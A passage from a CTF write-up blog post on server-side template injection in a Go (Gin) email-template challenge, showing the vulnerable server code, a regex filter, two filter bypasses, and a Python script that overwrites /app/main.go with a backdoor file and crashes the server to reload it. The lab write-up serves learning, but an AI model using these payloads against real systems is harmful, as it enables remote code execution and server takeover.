</span></span><span class=line><span class=cl>  <span class=mi>48</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>49</span>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>50</span>
</span></span><span class=line><span class=cl>  <span class=mi>51</span>      <span class=k>return</span> <span class=kc>true</span><span class=p>,</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>52</span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>53</span>
</span></span><span class=line><span class=cl>  <span class=mi>54</span>  <span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>55</span>      <span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=p>.</span><span class=nf>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>56</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>LoadHTMLGlob</span><span class=p>(</span><span class=s>&#34;templates/*&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>57</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Static</span><span class=p>(</span><span class=s>&#34;/assets&#34;</span><span class=p>,</span> <span class=s>&#34;./assets&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>58</span>
</span></span><span class=line><span class=cl>  <span class=mi>59</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>60</span>          <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>61</span>
</span></span><span class=line><span class=cl>  <span class=mi>62</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>63</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>64</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>65</span>
</span></span><span class=line><span class=cl>  <span class=mi>66</span>          <span class=k>defer</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>67</span>              <span class=k>if</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>();</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>68</span>                  <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>69</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>70</span>          <span class=p>}()</span>
</span></span><span class=line><span class=cl>  <span class=mi>71</span>
</span></span><span class=line><span class=cl>  <span class=mi>72</span>          <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>73</span>
</span></span><span class=line><span class=cl>  <span class=mi>74</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span> <span class=s>&#34;index.html&#34;</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;title&#34;</span><span class=p>:</span><span class=s>&#34;Test!&#34;</span><span class=p>,</span><span class=s>&#34;template&#34;</span><span class=p>:</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>),</span><span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=mi>75</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=mi>76</span>
</span></span><span class=line><span class=cl>  <span class=mi>77</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/update&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>78</span>          <span class=kd>var</span> <span class=nx>update</span> <span class=nx>Update</span>
</span></span><span class=line><span class=cl>  <span class=mi>79</span>          <span class=kd>var</span> <span class=nx>err</span> <span class=kt>error</span>
</span></span><span class=line><span class=cl>  <span class=mi>80</span>
</span></span><span class=line><span class=cl>  <span class=mi>81</span>          <span class=nx>err</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>BindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>update</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>82</span>
</span></span><span class=line><span class=cl>  <span class=mi>83</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>84</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>85</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>86</span>
</span></span><span class=line><span class=cl>  <span class=mi>87</span>          <span class=k>if</span> <span class=nx>b</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nf>filter</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=p>!</span><span class=nx>b</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>88</span>              <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>400</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>89</span>          <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>90</span>              <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>OpenFile</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>,</span> <span class=nx>os</span><span class=p>.</span><span class=nx>O_WRONLY</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_CREATE</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_TRUNC</span><span class=p>,</span> <span class=mo>0664</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>91</span>
</span></span><span class=line><span class=cl>  <span class=mi>92</span>              <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>93</span>                  <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>94</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>95</span>
</span></span><span class=line><span class=cl>  <span class=mi>96</span>              <span class=k>defer</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>97</span>
</span></span><span class=line><span class=cl>  <span class=mi>98</span>              <span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>WriteString</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>99</span>                  <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>100</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>101</span>
</span></span><span class=line><span class=cl> <span class=mi>102</span>              <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s>&#34;ok&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>103</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>104</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl> <span class=mi>105</span>
</span></span><span class=line><span class=cl> <span class=mi>106</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Any</span><span class=p>(</span><span class=s>&#34;/preview&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>107</span>          <span class=kd>var</span> <span class=nx>title</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>108</span>          <span class=k>if</span> <span class=nx>title</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>109</span>              <span class=nx>title</span> <span class=p>=</span> <span class=s>&#34;Test Email&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>110</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>111</span>
</span></span><span class=line><span class=cl> <span class=mi>112</span>          <span class=kd>var</span> <span class=nx>eventname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>113</span>          <span class=k>if</span> <span class=nx>eventname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>114</span>              <span class=nx>eventname</span> <span class=p>=</span> <span class=s>&#34;My-Event-Name&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>115</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>116</span>
</span></span><span class=line><span class=cl> <span class=mi>117</span>          <span class=kd>var</span> <span class=nx>firstname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>118</span>          <span class=k>if</span> <span class=nx>firstname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>119</span>              <span class=nx>firstname</span> <span class=p>=</span> <span class=s>&#34;John&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>120</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>121</span>
</span></span><span class=line><span class=cl> <span class=mi>122</span>          <span class=kd>var</span> <span class=nx>lastname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>123</span>          <span class=k>if</span> <span class=nx>lastname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>124</span>              <span class=nx>lastname</span> <span class=p>=</span> <span class=s>&#34;Smith&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>125</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>126</span>
</span></span><span class=line><span class=cl> <span class=mi>127</span>          <span class=kd>var</span> <span class=nx>companyname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>128</span>          <span class=k>if</span> <span class=nx>companyname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>129</span>              <span class=nx>companyname</span> <span class=p>=</span> <span class=s>&#34;Email Templating Inc.&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>130</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>131</span>
</span></span><span class=line><span class=cl> <span class=mi>132</span>          <span class=c1>// Fetch all custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>133</span>          <span class=kd>var</span> <span class=nx>num</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>134</span>          <span class=kd>var</span> <span class=nx>stop</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl> <span class=mi>135</span>          <span class=kd>var</span> <span class=nx>custom</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>136</span>          <span class=kd>var</span> <span class=nx>customs</span> <span class=p>=</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span><span class=p>{}</span>
</span></span><span class=line><span class=cl> <span class=mi>137</span>          <span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>!</span><span class=nx>stop</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>138</span>              <span class=nx>num</span> <span class=p>=</span> <span class=s>&#34;custom&#34;</span><span class=o>+</span><span class=nb>string</span><span class=p>(</span><span class=nx>i</span><span class=o>+</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>139</span>              <span class=nx>custom</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=nx>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>140</span>
</span></span><span class=line><span class=cl> <span class=mi>141</span>              <span class=k>if</span> <span class=nx>custom</span> <span class=o>==</span> <span class=s>&#34;&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>142</span>                  <span class=nx>stop</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl> <span class=mi>143</span>                  <span class=k>break</span>
</span></span><span class=line><span class=cl> <span class=mi>144</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>145</span>              <span class=nx>customs</span><span class=p>[</span><span class=nx>num</span><span class=p>]</span> <span class=p>=</span> <span class=nx>custom</span>
</span></span><span class=line><span class=cl> <span class=mi>146</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>147</span>
</span></span><span class=line><span class=cl> <span class=mi>148</span>          <span class=c1>// Create the response map
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>149</span>          <span class=kd>var</span> <span class=nx>response</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kd>interface</span><span class=p>{}</span> <span class=p>=</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>150</span>                  <span class=s>&#34;title&#34;</span><span class=p>:</span><span class=nx>title</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>151</span>                  <span class=s>&#34;eventname&#34;</span><span class=p>:</span><span class=nx>eventname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>152</span>                  <span class=s>&#34;firstname&#34;</span><span class=p>:</span><span class=nx>firstname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>153</span>                  <span class=s>&#34;lastname&#34;</span><span class=p>:</span><span class=nx>lastname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>154</span>                  <span class=s>&#34;companyname&#34;</span><span class=p>:</span><span class=nx>companyname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>155</span>                  <span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>156</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>157</span>
</span></span><span class=line><span class=cl> <span class=mi>158</span>          <span class=c1>// Merge the custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>159</span>          <span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>customs</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>160</span>              <span class=nx>response</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=p>=</span> <span class=nx>value</span>
</span></span><span class=line><span class=cl> <span class=mi>161</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>162</span>
</span></span><span class=line><span class=cl> <span class=mi>163</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>164</span>              <span class=s>&#34;preview.html&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>165</span>              <span class=nx>response</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>166</span>          <span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>167</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl> <span class=mi>168</span>
</span></span><span class=line><span class=cl> <span class=mi>169</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Run</span><span class=p>(</span><span class=s>&#34;127.0.0.1:8000&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>170</span>  <span class=p>}</span>
</span></span></code></pre></div></details><p>The main difference with the second level is that a <code>filter</code> function is called before updating the <code>templates/preview.html</code> file.</p><p>Let&rsquo;s look at the three specific regular expressions used to check our template input.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=nx>r1</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*([&#34;\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>r2</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>r3</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`</span><span class=p>)</span>
</span></span></code></pre></div><p>I like to use <a href=https://www.debuggex.com/>Debuggex</a> to help me visualize some regular expressions. Here is what the first regex is checking:</p><p><img src=/25f349ed-948e-48eb-969b-3cdca74b7b0e/debuggex-r1.png alt></p><p>If we test it with our level 2 template as input:</p><pre tabindex=0><code>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) &#34;/app/main.go&#34; }}
</code></pre><p>It will get matched due to the parentheses and the quotes. I quickly noticed that, after a quote or parenthesis, the regex is looking any character that is not <code>}</code>. So what if we somehow put <code>}</code> between before the end?</p><pre tabindex=0><code>{{ .c.SaveUploadedFile (.c.FormFile &#34;}&#34;) &#34;/app/main.go&#34; }}
</code></pre><p>Turns out, <code>}</code> is a perfectly fine form input name for the server and it does bypass the filter and the other two regexes do not even come into play as the payload does not contain those variables.</p><p><strong>FLAG-46dd90020d9b9d1270a8ee4be745405e</strong></p><h2 id=alternative>Alternative</h2><p>Early on, since level 1, I had examined the code related to <code>customs</code></p><ul><li>Level 1 - Line 153-167</li><li>Level 2 - Line 91-105</li><li>Level 3 - Line 132-146</li></ul><p>What I noticed was the odd way it allowed us to provide consecutive custom variables.
It starts with the first custom at &ldquo;index&rdquo; 1, which ends up being ASCII code 48+1, which is <code>custom1</code>. So if <code>custom1</code> exists, it will then check <code>custom2</code> (ASCII code 48+2 = &ldquo;2&rdquo;). It does not stop until the next <code>customX</code> is not defined. So if we define enough customs in our query parameters, we will end up with the following list:</p><pre tabindex=0><code>custom1
custom2
custom3
custom4
custom5
custom6
custom7
custom8
custom9
custom:
custom;
custom&lt;
custom=
custom&gt;
custom?
custom@
customA
customB
customC
</code></pre><p>Now, if you check the second and third regular expressions, you will notice that they only check for <code>.custom[0-9]+</code> which only accounts for the ones ending with a digit.
Thus, another unintended solve, would be to use the following template:</p><pre tabindex=0><code>{{ with .c.FormFile .customA }}
{{ .c.SaveUploadedFile . .customB }}
{{ end }}
</code></pre><p>After a bit of research, it turns out that a <code>*multipart.FileHeader</code> contains an exported field <code>Filename</code> and in our case, it takes the filename provided by the form input. We can remove the need for a second custom.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://dev-092f50226ea22197.email-template.ctf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;template&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>{{ with .c.FormFile .customA }}
</span></span></span><span class=line><span class=cl><span class=s2>{{ $.c.SaveUploadedFile . .Filename }}
</span></span></span><span class=line><span class=cl><span class=s2>{{ end }}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Form Input Name: fish</span>
</span></span><span class=line><span class=cl><span class=c1># Filename: /app/main.go</span>
</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;fish&#39;</span><span class=p>:</span> <span class=p>(</span><span class=s2>&#34;/app/main.go&#34;</span><span class=p>,</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;backdoor.go&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>))}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Updates the preview template.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Defines all the required custom variables and triggers the rendering of our template with the provided form file</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/preview?custom1=a&amp;custom2=a&amp;custom3=a&amp;custom4=a&amp;custom5=a&amp;custom6=a&amp;custom7=a&amp;custom8=a&amp;custom9=a&amp;custom%3A=a&amp;custom%3B=a&amp;custom%3C=a&amp;custom%3D=a&amp;custom</span><span class=si>%3E</span><span class=s2>=a&amp;custom</span><span class=si>%3F</span><span class=s2>=a&amp;custom%40=a&amp;customA=fish&#34;</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Crashes server, which restarts the service.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></div><p>After solving the third level, the challenge author informed me that this was unintended. Some time after the CTF, the author reached out to me to test a modified regular expression and I found that some parts of it could be bypassed due missing regex flag <code>(?s)</code>. This is due to the default configuration not matching <code>.</code> with newline characters.</p><h1 id=conclusion>Conclusion</h1><p>The third level showcases how hard it can be to get regex right on your first try. I did not write about the intended way as the challenge will be hosted on RingZer0 CTF in the future and I will leave something to play with.</p><p>It was a good learning experience to explore SSTI in Go as I did not know how it could occur. It does seem to require many conditions to be exploitable due to way templates are designed in Go, but that&rsquo;s the fun of CTFs to create those kind of situations!</p><p>I really enjoyed this challenge due to having to find gadgets within a known open-source library and due to getting practice auditing code which was a fun throwback to my OSWE certification.</p><p>The challenge author shared with me that they decided to look into vulnerabilities that can happen in Go after experiencing a challenge I designed and published on RingZer0 CTF with their help. That is how this SSTI challenge came to be. If you are curious, you can try my web challenge <code>Lotto 8/33</code> on <a href=https://ringzer0ctf.com/>RingZer0 CTF</a>.</p><p>Many thanks to the challenge author <strong>Marc Olivier Bergeron (MarcoB#1204)</strong></p></article></main><footer id=footer>© 2022 Jose Apari-Pantigozo</footer></body></html>